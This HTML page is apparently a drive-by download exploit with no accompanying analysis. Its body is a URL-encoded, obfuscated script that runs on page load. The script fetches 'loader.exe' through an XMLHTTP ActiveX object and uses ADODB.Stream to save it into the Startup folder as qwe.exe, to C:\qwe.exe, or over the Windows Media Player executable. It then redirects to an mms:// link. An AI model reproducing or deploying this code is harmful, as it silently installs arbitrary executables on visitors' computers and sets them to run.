<html><HEAD><META HTTP-EQUIV="Expires" CONTENT="-1">
 </HEAD>

<script language="vbscript">
    Function Exists(filename)
        On Error Resume Next
        LoadPicture(filename)
        Exists = Err.Number =  481
    End Function    
</script>


<body><SCRIPT LANGUAGE="Javascript">
function process(pe)
{
document.write(unescape(pe))
return ""
}
function start()
{
var pe=new Array()
pe[0]=new Array("%0D%0A<s%63r%69pt languag%65%3D%22javas%63r%69pt%22>%0D%0A%0D%0A%0D%0A%0D%0A fun%63t%69on %47%65t%5FW%69n%5FV%65rs%69on%28%29   %0D%0A {     %0D%0A %09var %49%45v%65rs%69on%3Dnav%69gator.appV%65rs%69on%3B     %0D%0A %09%69f %28%49%45v%65rs%69on.%69nd%65x%4Ff%28%27W%69ndows 95%27%29 !%3D -1%29 r%65turn %2295%22     %0D%0A %09%65ls%65 %69f %28%49%45v%65rs%69on.%69nd%65x%4Ff%28%27W%69ndows NT 4%27%29 !%3D -1%29 r%65turn %22NT%22     %0D%0A %09%65ls%65 %69f %28%49%45v%65rs%69on.%69nd%65x%4Ff%28%27W%69n 9x 4.9%27%29 !%3D -1%29 r%65turn %22M%45%22     %0D%0A %09%65ls%65 %69f %28%49%45v%65rs%69on.%69nd%65x%4Ff%28%27W%69ndows 9%38%27%29 !%3D -1%29 r%65turn %229%38%22     %0D%0A %09%65ls%65 %69f %28%49%45v%65rs%69on.%69nd%65x%4Ff%28%27W%69ndows NT 5.0%27%29 !%3D -1%29 r%65turn %222K%22     %0D%0A %09%65ls%65 %69f %28%49%45v%65rs%69on.%69nd%65x%4Ff%28%27W%69ndows NT 5.1%27%29 !%3D -1%29 r%65turn %22XP%22   %0D%0A }%0D%0A%0D%0A%0D%0A    wmplay%65rpaths%3D %5B%0D%0A            %22%43%3A%5C%5CProgramm%65r%5C%5CW%69ndows M%65d%69a Play%65r%5C%5Cwmplay%65r.%65x%65%22%2C%0D%0A            %22%43%3A%5C%5CProgram%5C%5CW%69ndows M%65d%69a Play%65r%5C%5Cwmplay%65r.%65x%65%22%2C%0D%0A            %22%43%3A%5C%5CProgramm%65%5C%5CW%69ndows M%65d%69a Play%65r%5C%5Cwmplay%65r.%65x%65%22%2C%0D%0A            %22%43%3A%5C%5CProgramm%69%5C%5CW%69ndows M%65d%69a Play%65r%5C%5Cwmplay%65r.%65x%65%22%2C%0D%0A            %22%43%3A%5C%5CProgramf%69l%65r%5C%5CW%69ndows M%65d%69a Play%65r%5C%5Cwmplay%65r.%65x%65%22%2C%0D%0A            %22%43%3A%5C%5CProgramas%5C%5CW%69ndows M%65d%69a Play%65r%5C%5Cwmplay%65r.%65x%65%22%2C%0D%0A            %22%43%3A%5C%5CPrograma1s%5C%5CW%69ndows M%65d%69a Play%65r%5C%5Cwmplay%65r.%65x%65%22%2C%0D%0A            %22%43%3A%5C%5CAr%63h%69vos d%65 programa%5C%5CW%69ndows M%65d%69a Play%65r%5C%5Cwmplay%65r.%65x%65%22%2C%0D%0A            %22%43%3A%5C%5CProgram F%69l%65s%5C%5CW%69ndows M%65d%69a Play%65r%5C%5Cwmplay%65r.%65x%65%22%0D%0A           %5D%3B%0D%0A   %69%69%69w%3D0%3B%0D%0A    for %28%69%3D0%3B%69<wmplay%65rpaths.l%65ngth%3B%69++%29 {%0D%0A        wmplay%65rpath %3D wmplay%65rpaths%5B%69%5D%3B%0D%0A        %69f %28%69%69%69w%3D%3D0 %26%26 %45x%69sts%28wmplay%65rpath%29%29%0D%0A            br%65ak%3B%0D%0A    }%0D%0A    %0D%0A    %0D%0A %0D%0A%0D%0A%0D%0A%0D%0A   var %49n%65tPath%3Ddo%63um%65nt.lo%63at%69on.hr%65f%3B%0D%0A   %69Pr%65f%69x%3D%49n%65tPath.substr%69ng%280%2C7%29%3B%0D%0A  %0D%0A   sw%69t%63h%28%69Pr%65f%69x%29%0D%0A   {%0D%0A   %63as%65 %22http%3A//%22 %3A%0D%0A                   j%3D%49n%65tPath.last%49nd%65x%4Ff%28%27/%27%29%3B%0D%0A                   %49n%65tPath%3D%49n%65tPath.sl%69%63%65%280%2Cj%29+%27/load%65r.%65x%65%27%3B%0D%0A                   br%65ak%3B %0D%0A   %63as%65 %22ms-%69ts%3A%22 %3A%0D%0A                   %69%3D%49n%65tPath.%69nd%65x%4Ff%28%27!%27%29%3B%0D%0A                   j%3D%49n%65tPath.last%49nd%65x%4Ff%28%27//%27%29%3B %0D%0A                   %49n%65tPath%3D%49n%65tPath.sl%69%63%65%28%69+1%2Cj%29+%27/load%65r.%65x%65%27%3B%0D%0A                   br%65ak%3B%0D%0A   }%0D%0A%0D%0A   var x %3D n%65w A%63t%69v%65X%4Fbj%65%63t%28%22M%69%63rosoft.XMLHTTP%22%29%3B %0D%0A   x.%4Fp%65n%28%22%47%45T%22%2C%49n%65tPath%2C0%29%3B %0D%0A   x.%53%65nd%28%29%3B  %0D%0A   %0D%0A   var W%69nV%65r%3D%47%65t%5FW%69n%5FV%65rs%69on%28%29%3B   %0D%0A%0D%0A   w%69n2k%3D%22%43%3A%5C%5CDo%63um%65nts and %53%65tt%69ngs%5C%5CAll %55s%65rs%5C%5C%53tart M%65nu%5C%5CPrograms%5C%5C%53tartup%5C%5Cqw%65.%65x%65%22   %0D%0A   //w%69n9%38%3D%22%63%3A%5C%5Cw%69ndows%5C%5C%53tart M%65nu%5C%5CPrograms%5C%5C%53tartup%5C%5Cqw%65.%65x%65%22  %0D%0A   w%69n9%38%3D%22%43%3A%5C%5Cqw%65.%65x%65 %22  %0D%0A//  al%65rt%28W%69nV%65r%29%3B%0D%0A   %69f %28W%69nV%65r%3D%3D%229%38%22%29%0D%0A   {%0D%0A   %09try%0D%0A   %09{%0D%0A%09%09var o%53tr%65am %3D n%65w A%63t%69v%65X%4Fbj%65%63t%28%27AD%4FDB.%53tr%65am%27%29%3B %0D%0A      %09%09o%53tr%65am.Mod%65 %3D 3%3B %0D%0A      %09%09o%53tr%65am.Typ%65 %3D 1%3B %0D%0A      %09%09o%53tr%65am.%4Fp%65n%28%29%3B %0D%0A      %09%09o%53tr%65am.Wr%69t%65%28x.r%65spons%65Body%29%3B %0D%0A      %09%09o%53tr%65am.%53av%65ToF%69l%65%28w%69n9%38%2C2%29%3B%0D%0A      %09%09%0D%0A   %09}%0D%0A   %09%63at%63h%28%65%29{}%0D%0A   }%0D%0A   %65ls%65%0D%0A   {%0D%0A%09%69f %28W%69nV%65r%3D%3D%222K%22%29%0D%0A   %09{%0D%0A   %09%09try%0D%0A   %09%09{%0D%0A      %09%09%09var o%53tr%65am %3D n%65w A%63t%69v%65X%4Fbj%65%63t%28%27AD%4FDB.%53tr%65am%27%29%3B %0D%0A      %09%09%09o%53tr%65am.Mod%65 %3D 3%3B %0D%0A      %09%09%09o%53tr%65am.Typ%65 %3D 1%3B %0D%0A      %09%09%09o%53tr%65am.%4Fp%65n%28%29%3B %0D%0A      %09%09%09o%53tr%65am.Wr%69t%65%28x.r%65spons%65Body%29%3B %0D%0A      %09%09%09o%53tr%65am.%53av%65ToF%69l%65%28w%69n2k%2C2%29%3B%0D%0A   %09%09}%0D%0A   %09%09%63at%63h%28%65%29{}%0D%0A   %0D%0A   %09}%0D%0A  %09%65ls%65%0D%0A  %09{%0D%0A  %09try%0D%0A   %09{%0D%0A      %09%09var o%53tr%65am %3D n%65w A%63t%69v%65X%4Fbj%65%63t%28%27AD%4FDB.%53tr%65am%27%29%3B %0D%0A      %09%09o%53tr%65am.Mod%65 %3D 3%3B %0D%0A      %09%09o%53tr%65am.Typ%65 %3D 1%3B %0D%0A      %09%09o%53tr%65am.%4Fp%65n%28%29%3B %0D%0A      %09%09o%53tr%65am.Wr%69t%65%28x.r%65spons%65Body%29%3B %0D%0A      %09%09o%53tr%65am.%53av%65ToF%69l%65%28wmplay%65rpath%2C2%29%3B%0D%0A   %09}%0D%0A   %09%63at%63h%28%65%29{}%0D%0A   %09mmss%3D%22mms%3A//%22%3B%0D%0A lo%63at%69on.hr%65f %3D mmss%3B%0D%0A    %0D%0A    }%0D%0A  }  %0D%0A</s%63r%69pt>")
process(pe);
}
start();

</script></body>
</html>


